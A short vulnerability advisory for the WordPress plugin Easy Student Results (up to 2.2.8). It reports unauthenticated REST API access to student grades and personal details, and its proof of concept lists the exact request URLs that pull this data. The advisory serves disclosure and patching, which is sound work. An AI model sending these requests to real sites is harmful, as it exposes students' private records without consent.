## WordPress Plugin Vulnerabilities

# Easy Student Results <= 2.2.8 - Sensitive Information Disclosure via REST API

### Description

The plugin lacks authorisation in its REST API, allowing unauthenticated users to retrieve information related to the courses, exams, departments as well as student's grades and PII such as email address, physical address, phone number etc

### Proof of Concept

When the "Enable API for Mobile Apps" settings (/wp-admin/admin.php?page=rps\_result\_settings) is enabled
https://example.com/wp-json/rps\_result/v1/route/show\_result?exam\_record\_id=2&student\_id=32
https://example.com/wp-json/rps\_result/v1/route/student\_fields
https://example.com/wp-json/rps\_result/v1/route/search\_student?department\_id=1&batch\_id=1&semester\_id=1
https://example.com/wp-json/rps\_result/v1/route/result\_fields
https://example.com/wp-json/rps\_result/v1/route/list\_results?exam\_id=1&department\_id=1&batch\_id=1
https://example.com/wp-json/rps\_result/v1/route/schema
